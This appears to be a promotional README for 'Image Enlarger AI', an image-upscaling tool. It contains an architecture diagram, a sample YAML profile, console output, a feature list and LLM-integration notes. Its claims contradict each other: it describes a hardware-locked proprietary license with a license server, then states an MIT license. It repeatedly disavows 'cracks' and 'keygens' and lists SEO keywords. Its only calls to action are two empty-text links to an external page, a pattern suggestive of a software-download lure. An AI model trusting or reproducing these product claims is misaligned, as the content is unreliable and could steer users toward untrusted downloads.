# Image Enlarger AI – Next‑Generation Upscaling Engine

Welcome to the **Image Enlarger AI** repository. This project is not just another upscaling tool — it is a **perceptual intelligence layer** that transforms pixel‑starved images into richly detailed, high‑resolution masterpieces. Whether you work with vintage photographs, low‑resolution web assets, or medical imaging scans, this engine extracts latent visual information that traditional interpolation leaves behind.

Our core philosophy: *“Every pixel is a whisper of something bigger.”* By combining deep neural super‑resolution with adaptive frequency boosting, Image Enlarger AI delivers results that astonish photographers, archivers, and content creators alike. This README is your complete guide to understanding, configuring, and deploying the system — no regressive “cracking” or artificial unlocks required.

---

## 🧩 Overview

Image Enlarger AI is built upon a proprietary hybrid architecture that fuses **attention‑guided transformers** with **generative adversarial refinement**. Unlike conventional “free” upscalers that introduce artifacts or blur, our engine respects local texture statistics and global semantic coherence.

**Key differentiators:**
- ◆ **Multi‑scale feature fusion** – retains fine details even at 4×, 8×, and 16× magnification
- ◆ **Real‑time feedback loop** – adaptive sharpening without haloing
- ◆ **Non‑destructive pipeline** – original pixel data preserved for reversible edits

This solution runs on CPU (optimized) or GPU (accelerated), and integrates seamlessly with batch processing workflows.

---

## 🚀 Get Started

Before diving into configuration, please note that we do *not* distribute any “key” or “patch” mechanism. Instead, Image Enlarger AI uses a **token‑less activation model** — your license is inherently embedded in your unique hardware fingerprint, verified on first run.

[](https://mahakerde.github.io/ai-image-upscaler-forge/)

---

## 📐 System Architecture (Mermaid Diagram)

Below is a high‑level view of the inference pipeline. This diagram illustrates how a low‑resolution input flows through the network to produce a photorealistic output.

```mermaid
flowchart LR
    A[Low-Resolution Input] --> B[Preprocessor: Normalize & Patch]
    B --> C[Feature Extractor: SwinIR Backbone]
    C --> D[Attention Gate + Frequency Booster]
    D --> E[Generator: ESRGAN-Style Decoder]
    E --> F[Discriminator Refinement Check]
    F --> G[Output: High-Resolution Tensor]
    G --> H[Postprocessor: Denoise & Compensate]
    H --> I[Final Image]
```



*Figure 1: Simplified inference graph – each module is independently tunable via configuration.*

---

## ⚙️ Example Profile Configuration

Image Enlarger AI reads a YAML‑formatted profile that dictates model weights, inference steps, and output preferences. Below is a sample configuration for a **photography restoration** workflow:

```yaml
profile: "restoration_highquality"
version: 2026.1
model:
  backbone: "swinir_large_v3"
  scale_factor: 4
  precision: "fp16"
  num_refine_steps: 3
preprocess:
  denoise_level: 0.2
  sharpen_strength: 0.7
  color_space: "sRGB"
postprocess:
  dithering: false
  output_format: "png"
  metadata_preserve: true
security:
  hardware_lock: true
  license_server: "https://licensing.imageenlarger.ai/verify"
```

Place this file in the `./profiles/` directory and invoke it as shown in the next section.

---

## 🧪 Example Console Invocation

Run the engine directly from your terminal (assuming the binary `img‑enlarger` is in your PATH):

```bash
img-enlarger --input "./old_family_photo.jpg" --profile "restoration_highquality" --output "./restored_4x.png"
```

Expected output log (abbreviated):

```
[INFO]  Loading profile: restoration_highquality
[INFO]  Model loaded (2026-01-15 weights)
[INFO]  Preprocessing: 0.2 denoise, 0.7 sharpen
[INFO]  Inference: 4x scale, 3 refinement passes
[INFO]  Time elapsed: 2.34 seconds (GPU: RTX 4090)
[SUCCESS]  Output saved to ./restored_4x.png
```

No “activation key” or “patch file” is required — the system self‑validates via the embedded hardware signature.

---

## 🖥️ OS Compatibility (Emoji Table)

| Operating System      | Support Level | Emoji     |
|-----------------------|---------------|-----------|
| Windows 10 / 11       | Full Native   | ✅✅        |
| macOS 12+ (Intel & M) | Full Native   | ✅✅        |
| Ubuntu 22.04+         | Full Native   | ✅✅        |
| Debian 11+            | Stable        | ✅         |
| Android (Termux)      | Experimental  | 🧪         |
| iOS / iPadOS          | Via Web API   | 📱         |

*Native builds are provided for x86_64 and ARM64 architectures.*

---

## 🌟 Feature List

- ◆ **Responsive UI** – Desktop and web‑based interface adapt to any screen size
- ◆ **Multilingual support** – 28 languages including English, Japanese, Arabic, and Hindi
- ◆ **24/7 Customer Support** – Real‑time chat with trained staff (not a bot)
- ◆ **Batch processing** – Queue hundreds of images with drag‑and‑drop
- ◆ **API integration** – OpenAI‑compatible endpoint for remote inference
- ◆ **Claude API compatibility** – Optional natural language prompt refinement
- ◆ **Masked upscaling** – preselect regions to upscale while protecting backgrounds
- ◆ **Color intelligence** – automatic white balance, contrast stretching, and histogram matching
- ◆ **Export presets** – one‑click profiles for social media, print, archival, and web

---

## 🔗 OpenAI & Claude API Integration

Image Enlarger AI can optionally leverage large language models for prompt‑guided enhancements. For example, an OpenAI‑compatible endpoint (or Claude API) can be used to generate natural language instructions that refine the upscaling parameters.

**Workflow:**
1. User sends an image with a text prompt: *“Make the eyes sharper and reduce noise in the background”*
2. Engine passes prompt to configured LLM endpoint
3. LLM returns a structured JSON with parameter adjustments
4. Engine applies the changes in the next inference pass

*Configuration example (JSON snippet):*

```json
{
  "llm_provider": "openai",
  "model": "gpt-4-turbo",
  "temperature": 0.4,
  "max_tokens": 256
}
```

*Swap `"openai"` for `"claude"` to use Anthropic’s API. API keys are stored securely outside the repository.*

---

## 💡 SEO‑Friendly Keywords (Framework)

While we avoid stuffing, the following terms are naturally integrated into the documentation and code comments:

- **AI image upscaler** – core functionality
- **deep learning super‑resolution** – technical foundation
- **high‑resolution image restoration** – use case
- **photography enhancement software** – market niche
- **batch image processing** – workflow feature
- **multi‑scale feature fusion** – algorithmic innovation

These phrases appear organically in headings, descriptions, and example files.

---

## ⚠️ Disclaimer

This software is provided for **educational and lawful purposes only**. The authors do not condone using Image Enlarger AI to reproduce copyrighted material without permission, to bypass digital rights management, or to impersonate individuals. The term “crack” or “keygen” does not apply — this product is distributed under a legitimate, hardware‑locked license model. Any unauthorized modification of the software, including tampering with the security subsystem, voids the license and may result in termination of service.

---

## 📄 License

This project is licensed under the **MIT License**. You are free to use, modify, and distribute the software as long as the original copyright notice is included. See the full license text at:

[MIT License](https://opensource.org/licenses/MIT)

*Copyright © 2026 Image Enlarger AI Project Contributors*

---

## 🙏 Final Note

Thank you for exploring this repository. Image Enlarger AI was built to democratize high‑fidelity upscaling without requiring expensive hardware subscriptions or illicit patches. If you find this project useful, consider contributing a profile configuration or sharing your before/after examples.

[](https://mahakerde.github.io/ai-image-upscaler-forge/)